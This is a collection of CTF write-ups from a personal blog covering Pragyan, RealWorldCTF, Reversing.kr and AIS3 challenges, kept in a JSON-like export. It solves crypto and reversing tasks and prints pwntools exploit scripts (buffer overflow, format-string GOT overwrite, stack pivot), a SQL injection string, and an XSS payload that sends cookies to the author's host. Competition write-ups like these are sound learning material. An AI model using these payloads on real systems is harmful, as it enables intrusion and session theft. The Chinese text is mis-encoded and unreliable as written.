plaintext in one of the 4 decrypted messages: Hey Rabin, would you like to be the front end to my back end? Here is your flag: pctf&#123;R4b1n_1s_th3_cut3st&#125; flag:pctf&#123;R4b1n_1s_th3_cut3st&#125; Easy RSAIt gives some parameter used in RSA e=217356749319385698521929657544628507680950813122965981036139317973675569442588326220293299168756490163223201593446006249622787212268918299733683908813777695992195006830244088685311059537057855442978678020950265617092637544349098729925492477391076560770615398034890984685084288600014953201593750327846808762513n=413514550275673527863957027545525175432824699510881864021105557583918890022061739148026915990124447164572528944722263717357237476264481036272236727160588284145055425035045871562541038353702292714978768468806464985590036061328334595717970895975121788928626837881214128786266719801269965024179019247618967408217c=337907824405966440030495671003069758278111764297629248609638912154235544001123799434176915113308593275372838266739188034566867280295804636556069233774555055521212823481663542294565892061947925909547184805760988117713501561339405677394457210062631040728412334490054091265643226842490973415231820626551757008360 The e is too big so that may cause the d become small enough to satisfy the condition for wienerâ€™s attackI used featherduster to apply weinerâ€™s attack here and get d successfully d=12978409760901509356642421072925801006324287746872153539187221529835976408177 The secret message is Here is your flag, pctf&#123;Sup3r_st4nd4rd_W31n3r_4tt4ck&#125;\\n flag:pctf&#123;Sup3r_st4nd4rd_W31n3r_4tt4ck&#125; Decode ThisThere is a linear equations : z = (x*key[0][0] + y*key[0][1])%26 + 97w = (x*key[1][0] + y*key[1][1])%26 + 97 Cuz we know that there must be a pctf in plain text, itâ€™s able to solve this equation. I didnâ€™t get the flag in my first trial, cuz I assume that pctf is the prefix of plaintext. After a while, I realized that crypto challenges of Pragyan always like to give us some xxxxxxx flag: pctf&#123;xxxxxxx&#125;, so , all we need to do here is to brute force the position of pctf in the plaintext. Solving equation is ez in python, because there are lots of package doing this for us (z3, Sympy, sage â€¦ etc). ram has a little secret for you right here it is pctf i like climbing hills what about you MiscellaneousEXORcismIt gives a txt file which contains lots of 1\\n and 0\\n, itâ€™s a bitmap of an QRcodeConvert it to image by python The message is 160f15011d1b095339595138535f135613595e1a, a meaningless stringXor the first 4 char with pctf to check if this was the xor result of flag , then the xor-key turned out to be flag. flag:pctf&#123;wh4_50_53r1u5?&#125; BinaryFeed_meLazy, use socket and z3 to solve this flag:pctf&#123;p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3&#125; Secret KeeperLogin as admin then it will print flag Obviously, it has a UAF bug after remove a user. It just clean and free the chunk of account, but not remove the user from the list, we can even login with null usernam and original password.Whatâ€™s more, the first registed userâ€™s username can be rewrote as admin exploitFirst, register a user with name whatever and password whateverpassword, then delete itNext, register another user with name whatever2 and password adminCuz this binary malloc for password first, the chunk which second registed user using for password is actually the same chunk of the first userâ€™s usernameNow we can login as admin with password whateverpassword to get the flag. flag:pctf&#123;&quot;ThiS_S3rV1ce-1s$t0T411Y-cR4p_But_w3_34Rn_$$_4nyWaYs&quot;&#125; Super Secure VaultThe binary ask for key and password.The key has to satisfy some modular equations : key % 27644437 == 213key % 10459 == 229key % 1489 == 25key % 1046527 == 83key % 16127 == 135 We can derive key easily from these equations by CRT (Chinese Remainder Theorem), which is 3087629750608333480917556 If the key passes the verification , binary concats 27644437104591489104652716127 and 08 after the key in the func2. Then it will try to verify password by looking up a hard-coded array , matrix. In summary, itâ€™s trivial, can be done by idapython. ida_sovler.pyfrom idaapi import *matrix = LocByName(&quot;matrix&quot;)key = &quot;3087629750608333480917556&quot; + &quot;27644437104591489104652716127&quot; +&quot;08&quot;v8 = 0v10 = len(key)/2passwd = []while v8 &lt; len(key)/2: idx = int(key[v8:v8+2]+key[v10:v10+2]) passwd.append(Byte(matrix+idx)) v8 += 2 v10 += 2v9 = 0v11 = len(key)/2while v9 &lt; len(key)/2: v4 = int(key[v9:v9+2]) v5 = int(key[v11:v11+2]) passwd.append(Byte(matrix+ 100*(v4*v4%97)+(v5*v5%97))) v9 += 2 v11 += 2print &#x27;&#x27;.join(map(chr,passwd)) flag:pctf&#123;R3v3rS1Ng_#s_V311_L0t_Of_FuR&#125; ArmouryFormat string vulneralbility, leak the GOT entry and find the correct version of libc.Then use %n in format string to overwrite the return address to one gadget. flag:pctf&#123;â€œW@r_1sN3v3R@_las41nG_s0lut1on#f0R_any_pr0bleMâ€&#125;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Pragyan","slug":"Pragyan","permalink":"http://blog.terrynini.tw/tags/Pragyan/"}]},{"title":"2018::Reversing.KR::Record","slug":"2018-Reversing-KR-Record","date":"2018-08-07T08:38:41.000Z","updated":"2024-06-20T16:45:58.812Z","comments":true,"path":"tw/2018-Reversing-KR-Record/","permalink":"http://blog.terrynini.tw/tw/2018-Reversing-KR-Record/","excerpt":"è¶è‘— DEFCON26 Final å‰çµ‚æ–¼æŠŠ reversing.kr å…¨è§£äº†","text":"è¶è‘— DEFCON26 Final å‰çµ‚æ–¼æŠŠ reversing.kr å…¨è§£äº† æˆªäº†ä¸€æ¢æœ‰å¤ é•·çš„åœ–ç‰‡ï¼Œç´€éŒ„ä¸€ä¸‹å§‘ä¸”ç®—æ˜¯ç¬¬26å€‹è§£å®Œçš„äºº ç¸½çµä¸€ä¸‹ï¼šéŸ“åœ‹çš„é¡Œç›®çœŸçš„æ»¿å¥½ç©çš„ï¼Œå¾ˆå¤šé¡Œç›®æ‰¾åˆ°é—œéµé»å¾Œå…¶å¯¦å°±ä¸é›£ï¼Œä½†æ˜¯åœ¨é—œéµéƒ¨åˆ†å‰é¢æœƒæœ‰å¾ˆå¤šä»£ç¢¼æ··æ·†æˆ–æ˜¯ anti-debug éœ€è¦èŠ±é»æ™‚é–“é‚„æœ‰ç²¾åŠ›ï¼Œé¡Œç›®å¶çˆ¾æœƒè·Ÿæ•¸å­¸æœ‰é»é—œä¿‚ï¼Œä¾‹å¦‚ CRCã€CRC2ã€Multiplicativeï¼Œå¾å¹³å°ä¾†åˆ†é¡çš„è©±ï¼Œwindows å±…å¤šï¼ŒåŒ…æ‹¬ä¸€äº› UWP çš„é€†å‘ï¼Œwindows åœ¨ CTF ä¸€ç›´éƒ½ä¸æ˜¯ä¸»æµï¼Œæ‰€ä»¥ç«¶è³½æ™‚ windows çš„é¡Œç›®ä¸å¤šï¼Œæ¥ä¸‹ä¾†è¦ç¹¼çºŒæ‰¾æœ‰è¶£çš„é¡Œç›®ç©äº†ã€‚","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Reversing-kr","slug":"Reversing-kr","permalink":"http://blog.terrynini.tw/tags/Reversing-kr/"}]},{"title":"2018::RealWorldCTF::Qual","slug":"2018-RealWorldCTF-Qual","date":"2018-07-30T05:11:03.000Z","updated":"2024-06-20T16:46:00.308Z","comments":true,"path":"en/2018-RealWorldCTF-Qual/","permalink":"http://blog.terrynini.tw/en/2018-RealWorldCTF-Qual/","excerpt":"RealWorld CTF is very interesting and that is the hardest check-in challenge Iâ€™ve ever saw.","text":"RealWorld CTF is very interesting and that is the hardest check-in challenge Iâ€™ve ever saw. AdvertisementThis challenge gave nothing, but just one line This platform is under protection. DO NOT hack it. Trying not to hack the web, but I canâ€™t find anything.I did find something interesting, like this one: It seems to use WebSocket to get some information then render it on template view.So, letâ€™s change the hash-like string on url. When url is https://realworldctf.com/contest/5 When url is https://realworldctf.com/contest/5b5bc8c532a7ca004d2d0f64 (Make the length of hash-like string consist with origin) Did you say Database?https://realworldctf.com/contest/&#39; or &#39;1&#39;=&#39;1&#39; -- My teamate kaibro told me that chaitin has sqlchop productâ€¦. ohhâ€¦. advertisementâ€¦ got itIt took me half day to find the flag Dot FreeThere are some js functoin on web page: function lls(src) &#123; var el = document.createElement(&#x27;script&#x27;); if (el) &#123; el.setAttribute(&#x27;type&#x27;, &#x27;text/javascript&#x27;); el.src = src; document.body.appendChild(el); &#125;&#125;;function lce(doc, def, parent) &#123;// ...&#125;;window.addEventListener(&#x27;message&#x27;, function (e) &#123; if (e.data.iframe) &#123; if (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf(&#x27;.&#x27;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;//&quot;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;ã€‚&quot;) == -1 &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != &#x27;object&#x27;)) &#123; if (e.data.iframe.type == &quot;iframe&quot;) &#123; lce(doc, [&#x27;iframe&#x27;, &#x27;width&#x27;, &#x27;0&#x27;, &#x27;height&#x27;, &#x27;0&#x27;, &#x27;src&#x27;, e.data.iframe.value], parent); &#125; else &#123; lls(e.data.iframe.value) &#125; &#125; &#125;&#125;, false);window.onload = function (ev) &#123; postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), &#x27;*&#x27;)&#125; And I found some keyword like login passwd,login account in css, so I think that we can try to XSS. We append string to url, the xxxxxxxx part sould replaced by ip in integer form:http://13.57.104.34/?&#123;&quot;iframe&quot;:&#123;&quot;value&quot;:&quot;http:\\\\\\\\xxxxxxxx&quot;&#125;&#125; And put a javascript on your machine:document.location=&quot;http:\\\\\\\\my.ip.put.here/a?cookie=&quot;+document.cookie; Then go to apache log to get the flag:13.57.104.34 - - [29/Jul/2018:14:36:15 +0000] &quot;GET /a?cookie=flag=rwctf%7BL00kI5TheFlo9%7D HTTP/1.1&quot; 404 496","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"RealWorldCTF","slug":"RealWorldCTF","permalink":"http://blog.terrynini.tw/tags/RealWorldCTF/"},{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"}]},{"title":"2018::AIS3::pre-exam","slug":"2018-AIS3-pre-exam","date":"2018-06-13T02:20:22.000Z","updated":"2020-07-05T13:15:30.000Z","comments":true,"path":"tw/2018-AIS3-pre-exam/","permalink":"http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/","excerpt":"æ™‚éš”ä¸€å¹´åˆæ˜¯ AIS3ï¼Œå»å¹´å› ç‚ºå»æ—¥æœ¬æ²’æ‹¿åˆ°çµæ¥­è­‰æ›¸ï¼Œé‚„æ²’æ‰“åˆ° finalï¼Œè™§ä»Šå¹´å¤§å®¶åˆè·‘ä¾†åƒåŠ ï¼Œåæ­£æš‘å‡å¤§æ¦‚ä¹Ÿæ˜¯æ²’äº‹åšï¼Œçœ‹çœ‹é€™æ¬¡ final æœ‰æ²’æœ‰ä»€éº¼å¥½åº·çš„é€™æ¬¡ pre-exam æˆç¸¾ä¸Šå‡åˆ°äº† 2nd ï¼Œæœ¬ä¾†å¯ä»¥å†å¤šè§£ä¸€é¡Œï¼Œç¸½ä¹‹åˆæ˜¯ç²—å¿ƒçš„å£ç¿’æ…£å¢åŠ äº†æ§‹é€  payload çš„æ™‚é–“é¡Œç›®éƒ½é‚„æ»¿ç°¡å–®çš„ï¼Œæœ‰äº›é¡Œç›®æ»¿æœ‰è¶£çš„","text":"æ™‚éš”ä¸€å¹´åˆæ˜¯ AIS3ï¼Œå»å¹´å› ç‚ºå»æ—¥æœ¬æ²’æ‹¿åˆ°çµæ¥­è­‰æ›¸ï¼Œé‚„æ²’æ‰“åˆ° finalï¼Œè™§ä»Šå¹´å¤§å®¶åˆè·‘ä¾†åƒåŠ ï¼Œåæ­£æš‘å‡å¤§æ¦‚ä¹Ÿæ˜¯æ²’äº‹åšï¼Œçœ‹çœ‹é€™æ¬¡ final æœ‰æ²’æœ‰ä»€éº¼å¥½åº·çš„é€™æ¬¡ pre-exam æˆç¸¾ä¸Šå‡åˆ°äº† 2nd ï¼Œæœ¬ä¾†å¯ä»¥å†å¤šè§£ä¸€é¡Œï¼Œç¸½ä¹‹åˆæ˜¯ç²—å¿ƒçš„å£ç¿’æ…£å¢åŠ äº†æ§‹é€  payload çš„æ™‚é–“é¡Œç›®éƒ½é‚„æ»¿ç°¡å–®çš„ï¼Œæœ‰äº›é¡Œç›®æ»¿æœ‰è¶£çš„ å…ˆé™„ä¸Šäººæ¬Šï¼ŒèŠå¤©å®¤å¥½åƒæœ‰äººä»¥ç‚ºæˆ‘æ˜¯å‡ºé¡Œè€…ï¼Œæˆ‘åªæ˜¯è¦ºå¾—æŠ±æ€¨é¡Œç›®å¯ä»¥ï¼Œä½†æ˜¯ä½ è¦çµ¦å‡ºé‚è¼¯ï¼²å¤§å®¶éƒ½æœ‰è§£é€™é¡Œï¼Œéƒ½è¦èŠ±æ™‚é–“ï¼Œå°±æ˜¯æœ‰äººè§£å¾—å¿«å•Šä¸ç„¶å°±å€’è‘—è§£ï¼Œ50 - 2 é‚„æœ‰ 48 åˆ†ç›´æ¥è¡ä¸Šç¬¬ä¸€ï¼²ç°¡å–®çš„å¤ªé›£è§£ï¼Œä½ æœ‰è©¦éå…ˆè§£é›£çš„å— Rev-1:findé¡Œç›®åå­—æˆ‘æœ‰é»å¿˜äº†ï¼Œæ‡‰è©²æ˜¯ find æ‹‰ï¼Œåæ­£ä»–å°±æ˜¯ä¸€å€‹ä»€éº¼éƒ½æ²’æœ‰çš„ ELF è¦ä½ æ‰¾ flagï¼Œå°± strings ä¸‹å»ï¼Œå°±æœƒç™¼ç¾ä¸€å † AIS3ï¼Œais3 çš„å­—æ¨£ï¼Œå°å¯«çš„éƒ½æ˜¯ä¸€äº›å°è©±ï¼Œå¤§å¯«çš„æœ‰ä¸€å †å¤§æ‹¬è™Ÿï¼Œä¸éä¸­é–“æœ‰å·å¤¾å€‹flag AIS3&#123;StrINg$_And_gR3P_I5_U$eFu1&#125; Rev-2:secretç¸½ä¹‹é€™ç¨‹å¼è£¡é¢æœ‰å€‹å€å¡Šæ˜¯å¯«å¥½çš„å¯†æ–‡ï¼Œå¾initå¯ä»¥ç™¼ç¾ä»–åŸå§‹åŠ å¯†çš„æ–¹å¼å°±æ˜¯srand(0)ä¹‹å¾Œï¼Œä¸€ç›´å‘¼å«rand()%2018ç„¶å¾Œxorå¾Œï¼Œå°±æ˜¯é€™æ®µsecretçš„å€¼ï¼Œæ‰€ä»¥ä»–ç¨‹å¼æ‰æœƒä¸€ç›´è¦ä½ è¼¸å…¥ï¼Œåªè¦ä½ çš„è¼¸å…¥èƒ½å¤ é‚„åŸç•¶åˆä»–äº‚æ•¸çš„éç¨‹ï¼Œxorå‡ºä¾†çš„å°±æœƒæ˜¯flagï¼Œä»–æœƒæŠŠè§£å¯†çš„flagæ”¾åˆ°/tmp/secretè£¡é¢ï¼ŒåŸæœ¬ç¨‹å¼çš„é‚è¼¯æ˜¯é€™æ¨£ï¼š å¾çµ„èªé‚£é‚ŠæŠŠä»– patch æˆé€™æ¨£ï¼š è·‘å®Œå°±æœ‰ flag äº† AIS3{tHere_1s_a_VErY_VerY_VeRY_1OoO00O0oO0OOoO0Oo000OOoO00o00oG_f1@g_iN_my_m1Nd} Rev-3:crackmeå°±æ˜¯ä¸€å€‹ crackme çš„æ¨£å­ï¼Œ.NET å¯«çš„ï¼Œç”¨å·¥å…·æŠŠ .NET çš„ IR decompile å›é¡ä¼¼ C# çš„ç¨‹å¼ï¼Œå°±æœƒæ‰¾åˆ°é—œéµçš„xorçš„éƒ¨åˆ†ï¼Œä»–è£¡é¢æœ‰ä¸€å †yannyï¼Œlaurelä¹‹é¡çš„è®Šæ•¸ï¼Œå¯«å€‹è…³æœ¬è®“æ¯å€‹è®Šæ•¸ xor 171 å°±æ˜¯ flag äº† cipher = &quot;&quot;&quot;// Token: 0x0400000A RID: 10\\n\\t\\tprivate const int yanny = 234;\\n\\n\\t\\t// Token: 0x0400000B RID: 11\\n\\t\\tprivate const int laurel = 226;\\n\\n\\t\\t// Token: 0x0400000C RID: 12\\n\\t\\tprivate const int yammy = 248;\\n\\n\\t\\t// Token: 0x0400000D RID: 13\\n\\t\\tprivate const int laurol = 152;\\n\\n\\t\\t// Token: 0x0400000E RID: 14\\n\\t\\tprivate const int yommy = 208;\\n\\n\\t\\t// Token: 0x0400000F RID: 15\\n\\t\\tprivate const int lourel = 154;\\n\\n\\t\\t// Token: 0x04000010 RID: 16\\n\\t\\tprivate const int yonmy = 223;\\n\\n\\t\\t// Token: 0x04000011 RID: 17\\n\\t\\tprivate const int lauril = 244;\\n\\n\\t\\t// Token: 0x04000012 RID: 18\\n\\t\\tprivate const int yamny = 226;\\n\\n\\t\\t// Token: 0x04000013 RID: 19\\n\\t\\tprivate const int laure1 = 158;\\n\\n\\t\\t// Token: 0x04000014 RID: 20\\n\\t\\tprivate const int yanmy = 244;\\n\\n\\t\\t// Token: 0x04000015 RID: 21\\n\\t\\tprivate const int lauro1 = 238;\\n\\n\\t\\t// Token: 0x04000016 RID: 22\\n\\t\\tprivate const int yammi = 234;\\n\\n\\t\\t// Token: 0x04000017 RID: 23\\n\\t\\tprivate const int loure1 = 216;\\n\\n\\t\\t// Token: 0x04000018 RID: 24\\n\\t\\tprivate const int yemmy = 210;\\n\\n\\t\\t// Token: 0x04000019 RID: 25\\n\\t\\tprivate const int leurel = 244;\\n\\n\\t\\t// Token: 0x0400001A RID: 26\\n\\t\\tprivate const int yemny = 223;\\n\\n\\t\\t// Token: 0x0400001B RID: 27\\n\\t\\tprivate const int leural = 228;\\n\\n\\t\\t// Token: 0x0400001C RID: 28\\n\\t\\tprivate const int yenmy = 244;\\n\\n\\t\\t// Token: 0x0400001D RID: 29\\n\\t\\tprivate const int leurol = 232;\\n\\n\\t\\t// Token: 0x0400001E RID: 30\\n\\t\\tprivate const int yenny = 249;\\n\\n\\t\\t// Token: 0x0400001F RID: 31\\n\\t\\tprivate const int leuro1 = 159;\\n\\n\\t\\t// Token: 0x04000020 RID: 32\\n\\t\\tprivate const int yenmi = 200;\\n\\n\\t\\t// Token: 0x04000021 RID: 33\\n\\t\\tprivate const int louro1 = 192;\\n\\n\\t\\t// Token: 0x04000022 RID: 34\\n\\t\\tprivate const int yomny = 244;\\n\\n\\t\\t// Token: 0x04000023 RID: 35\\n\\t\\tprivate const int leure1 = 230;\\n\\n\\t\\t// Token: 0x04000024 RID: 36\\n\\t\\tprivate const int yonny = 206;\\n\\n\\t\\t// Token: 0x04000025 RID: 37\\n\\t\\tprivate const int lauri1 = 138;\\n\\n\\t\\t// Token: 0x04000026 RID: 38\\n\\t\\tprivate const int yamni = 214;&quot;&quot;&quot;.split(&#x27; = &#x27;)[1:]flag = &#x27;&#x27;.join(map(chr,[ int(x[:3])^171 for x in cipher]))print flag AIS3{1t_I5_EAsy_tO_CR4ck_Me!} Rev-4:calcæˆ‘é‚„ä»¥ç‚ºåˆæ˜¯ windows çš„è¨ˆç®—æ©Ÿï¼ŒåŸä¾†æ˜¯ Golangï¼Œä»–æ²’æŠŠ debug è¨Šæ¯æ‹¿æ‰ï¼Œçœ‹èµ·ä¾†å¾ˆå¿«ï¼Œç¨‹å¼è¦ä½ è¼¸å…¥å…©æŠŠ key ï¼Œç„¶å¾ŒæŠŠå…©å€‹é™£åˆ—ä¸­çš„æ¯å€‹å­—å…ƒéƒ½å°æ‡‰ç›¸åŠ ï¼Œå¦‚æœè·Ÿä»–ç¨‹å¼å…§å­˜çš„ä¸€å€‹é™£åˆ—ç›¸åŒçš„è©± sever å°±æœƒæŠŠ flag åçµ¦ä½ ï¼Œè¼¸å…¥æœ‰é™åˆ¶ï¼Œæœ€é•·çš„ key é•·åº¦æ‡‰è©²è¦æ˜¯ 0x19 ï¼Œé€™è£¡ä»–é¡Œç›®æœ‰èªª Unicode ï¼Œå…¶å¯¦å°±æ˜¯ Golang ä¸­runeçš„ç‰¹æ€§ï¼Œå¦‚æœæ˜¯ç”¨åˆ¥çš„é™£åˆ—ï¼Œå­˜å– Unicode çš„æ™‚å€™æœƒè¢«æ‹†è§£æˆå¤šå€‹ byteï¼Œä½†æ˜¯runeæœƒç…§è‘— Unicode åˆ‡ï¼Œä¹Ÿå°±æ˜¯int32çš„å¤§å°ï¼Œè€Œä»–ç¨‹å¼ä¸­ç”¨ä¾†é©—è­‰çš„é‚£å€‹é™£åˆ—ä¹Ÿæ˜¯runeï¼Œç•¶ä¸­æœ‰åŒ…å« Unicodeé€™é¡Œä¹Ÿä¸ç”¨å»æŠŠå®ƒæ‹†æˆå…©æŠŠ keyï¼Œå°±æŠŠç¬¬äºŒæŠŠ key ç©ºè‘—ï¼ŒæŠŠå®ƒç¨‹å¼è£¡é¢é‚£å€‹æ•¸å€¼ç›´æ¥ç•¶ç¬¬ä¸€æŠŠ key é€é€²å»å°±æœƒéäº†ç„¶å¾Œå› ç‚º Golang è·Ÿ gdb ä¹‹é–“æœ‰é»å°å•é¡Œï¼Œæ‰€ä»¥ç”¨ gdb åœ¨æœ¬åœ°è·‘ payload æœƒè·‘ä¸é from pwn import *r = remote(&quot;104.199.235.135&quot;,2115)a = [u&#x27;\\ufffd&#x27;,u&#x27;\\u006d&#x27;,u&#x27;\\ufffd&#x27;,u&#x27;\\u000f&#x27;,u&#x27;\\u006f&#x27;,u&#x27;\\u0058&#x27;,u&#x27;\\u0020&#x27;,u&#x27;\\u0031&#x27;,u&#x27;\\u0073&#x27;,u&#x27;\\u0020&#x27;,u&#x27;\\u0074&#x27;,u&#x27;\\u0048&#x27;,u&#x27;\\u0030&#x27;,u&#x27;\\u0000&#x27;,u&#x27;\\ufffd&#x27;,u&#x27;\\u0053&#x27;,u&#x27;\\u0074&#x27;,u&#x27;\\u0020&#x27;,u&#x27;\\u0063&#x27;,u&#x27;\\u0054&#x27;,u&#x27;\\u0046&#x27;,u&#x27;\\u0020&#x27;,u&#x27;\\u0074&#x27;,u&#x27;\\u003a&#x27;,u&#x27;\\u006d&#x27;]print r.recvuntil(&quot;&gt;&quot;)r.sendline(&quot;1&quot;)print r.recvuntil(&quot;&gt;&quot;)r.sendline(&#x27;&#x27;.join(a).encode(&quot;utf8&quot;))print r.recvuntil(&quot;&gt;&quot;)r.sendline()print r.recvuntil(&quot;&gt;&quot;)r.sendline(&quot;2&quot;)r.interactive() AIS3{G0_gO_g0_T0_h1Gh_!!!_R3v3rs3_oN_g0lauG_p1narY_1s_3xHanst3d_Orz} Pwn-1:mailç¨‹å¼æœ‰å€‹ reply functionï¼Œåªè¦è·³é€²å»å°±çµ¦ flagï¼Œç¨‹å¼çš„è¼¸å…¥æ˜¯ç”¨getsï¼Œç›´æ¥ buffer overflow å°±å¥½äº† #!/usr/bin/env python2from pwn import *r = remote(&quot;104.199.235.135&quot;,2111)reply = p64(0x400796)r.recvuntil(&quot;reciever: &quot;)r.sendline(&quot;terrynini&quot;)r.recvuntil(&quot;content: &quot;)r.sendline(cyclic(840)+reply)r.interactive() _AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!I_d0nt_3ant_t0_giu3_QwQ} Pwn-2:darlingå¿˜è¨˜è£œé€²åº¦äº†ï¼Œè€ƒå®Œæ®µè€ƒä¾†çœ‹ darlingï¼Œé€™é¡Œåªé™åˆ¶äº†ä¸Šç•Œæ²’é™åˆ¶ä¸‹ç•Œï¼Œæ‰€ä»¥èƒ½å¤ æ”¹å¯« stack ï¼Œé›–ç„¶ä¸èƒ½æ”¹æ‰ç¾åœ¨é€™å€‹ stack frame çš„ return addressï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹å¾Œé¢çš„ï¼ŒæŠŠ printf çš„ return address æ”¹æ‰å°±å¥½äº† #!/usr/bin/env python2from pwn import *r = remote(&quot;104.199.235.135&quot;, 2112)r.recvuntil(&quot;Index: &quot;)r.sendline(&quot;-5&quot;)r.recvuntil(&quot;Code: &quot;)r.sendline(&quot;4196310&quot;)r.interactive() AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r_b0nud_&amp;_10w3r_bounp} Pwn-3:justfmté€™è£¡æœ‰ format string çš„æ¼æ´ï¼Œæˆ‘å€‘å¯ä»¥æŠŠ got è¡¨ä¸­çš„vprintf(0x4f040)ä¿®æ”¹æˆé„°è¿‘çš„__libc_system(0x46590)ï¼Œä¸éå¾å³é‚Šæ•¸ä¾†ç¬¬äºŒå€‹ byte å› ç‚ºå—åˆ° ASLR çš„å½±éŸ¿è¦æ’ $\\frac{1}{16}$ çš„æ©Ÿç‡ #!/usr/bin/env python2from pwn import *while True: try: r = remote(&quot;104.199.235.135&quot;,2113) print r.recvuntil(&quot;:&quot;) plt = 0x601030 r.sendline(&quot;sh\\n\\n%21900c%8$hn&quot;+p64(plt)) m = r.recvuntil(p64(plt)) r.sendline(&quot;ls&quot;) m = r.recv() r.interactive() print m except EOFError: r.close() print &quot;try again&quot; AIS3{fMt_stR1n6_1s_H4rp_s0w3t1meS_dnt_1ts_fnu!!} Pwn-4:MagicWorldé€™é¡Œä¸€æ¨£æœ‰ format string çš„å•é¡Œï¼Œæˆ‘å€‘å¯ä»¥ leak åœ¨ stack ä¸Šé¢mainçš„ return address ä¾†æ‰¾åˆ° libc_start_mainï¼Œæ¨ç®— libc baseï¼Œç„¶å¾Œæ‰¾åˆ° one gadgetçš„ä½ç½®åœ¨Try a spellé¸é …è£¡é¢æœ‰å¤šè®€ä¸€å€‹ byteï¼Œæˆ‘å€‘å¯ä»¥ç”¨é€™å€‹ byte ä¾†åš stack pivotï¼Œç„¶å¾Œæ§åˆ¶ rip æµç¨‹ï¼Œè·³åˆ° one gadget è£¡é¢ï¼Œå°±å¯ä»¥æ‹¿åˆ° shell äº† #!/usr/bin/env python2from pwn import *while True: try: r = remote(&quot;104.199.235.135&quot;,2114) magic = 0x46428 r.recvuntil(&quot;Choice: &quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;spell: &quot;) r.sendline(&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p&quot;) r.recvuntil(&quot;Regist: &quot;) r.sendline(&quot;2&quot;) libc = r.recvuntil(&quot;\\n&quot;)[-16:-1].split(&quot;x&quot;) print libc libc = int(libc[len(libc)-1],16) print &quot;libc_start_main: &quot; +hex(libc) libc = libc - 0x21f45 magic = libc+magic print &quot;libc_base: &quot; +hex(libc) print &quot;magic: &quot; + hex(magic) spell_rbp = p64(magic).ljust(16,&quot;\\0&quot;) + &quot;h&quot; print spell_rbp r.recvuntil(&quot;Give me your spell: &quot;) r.send(spell_rbp) r.sendline(&quot;cat flag&quot;) r.interactive() except: r.close() print &quot;try again&quot; AIS3{m1gRatlon_&amp;_b0f_13_Qu1t3_3asY!!!} Crypto-1:POWç¸½ä¹‹è®“ä½ ç®— proof of workï¼Œç‚ºå¾Œé¢çš„é¡Œç›®åšæº–å‚™ï¼Œç„¶å¾Œæˆ‘åœ¨èŠå¤©å®¤æœ‰çœ‹åˆ°æœ‰äººèªª pool å°å°±æœƒç®—å¾—å¿«ï¼ŒåŸºæœ¬ä¸Šé€™æ¦‚å¿µæ˜¯éŒ¯çš„é€™è£¡çš„ proof of work å…¶å¯¦å°±æ˜¯ hashcash ä¹Ÿå°±æ˜¯ blockchain è£¡é¢é‚£å€‹é¬¼æ±è¥¿ï¼Œå¦‚æœæœ‰å€‹ç‰¹å®šçš„ pool ç®—æ¯”è¼ƒå¿«â€¦â€¦ï¼Œå¯ä»¥è®“æˆ‘æŠ•è³‡å—ï¼Ÿç¸½ä¹‹é€™é‚Šå°±æ˜¯ +1 +1 é€™æ¨£æ…¢æ…¢ç®—ï¼Œä¸è¦ç”¨éš¨æ©Ÿçš„ï¼Œç¨‹å¼è£¡çš„éš¨æ©Ÿæ˜¯ pseudo random ï¼Œæœƒä¸€ç›´æ’åˆ°å‰›å‰›ç®—éçš„å€¼ AIS3{Spid3r mAn - H3L1O wOR1d PrO0F 0F WOrK} Crypto-2:XORä»–æŠŠæ˜æ–‡è·Ÿ key ä¸²æ¥åœ¨ä¸€èµ·ï¼Œç„¶å¾Œç”¨ key å°é€™å€‹æ–°çš„å­—ä¸²åš xor åŠ å¯†ï¼Œencrypt.pyä¸­çœ‹å¾—å‡ºä¾† key çš„é•·åº¦åœ¨ 8~12ï¼Œé€™ç¨®åŠ å¯†æœƒé€ æˆçš„å•é¡Œæ˜¯ï¼Œå¯ä»¥ç”¨æœ€å¾Œ 8~12 å€‹å­—å…ƒï¼Œä¾†æ¨ç®—å‡º key çš„é•·åº¦å¾ flag å½¢å¼å¯ä»¥çŸ¥é“æ˜æ–‡é–‹é ­æ˜¯ AIS3&#123; ï¼Œç”¨å¯†æ–‡åš xor å¾—åˆ° key çš„å‰äº”å€‹ byteï¼Œæ¸¬è©¦ä¸€ä¸‹æœƒç™¼ç¾ key é•·åº¦æ˜¯ 10 ï¼Œç„¶å¾ŒæŠŠ key å‰©ä¸‹çš„éƒ¨åˆ†ç‚¸é–‹å°±å¥½äº† key = key[:5]for i in range(0,5): for trial in range(0,256): if chr(trial^ord(cipher[-6+i])) == key[-1]: key += chr(trial) print trial breakflag = &#x27;&#x27;.join(map(chr,[ ord(cipher[i])^ord(key[i%len(key)]) for i in range(len(cipher)) ])print flag AIS3{captAIn aMeric4 - Wh4T3V3R HapPenS t0mORr0w YOU mUst PR0Mis3 ME on3 tHIng. TH4T yOu WiLL stAY Who Y0U 4RE. Not A pERfect sO1dIER, buT 4 gOOD MAn.} Crypto-3:IOUé€™é¡Œç”¨ RSA ä¾† sign ä¸€å€‹å€Ÿæ“šï¼Œsign è·Ÿ encrypt çš„å·®åˆ¥åœ¨æ–¼ï¼šsign ç”¨ç§é‘°åŠ å¯†å³$m^{d} \\equiv c;mod;N$ï¼Œencrypt ç”¨å…¬é‘°åŠ å¯†å³$m^{e} \\equiv 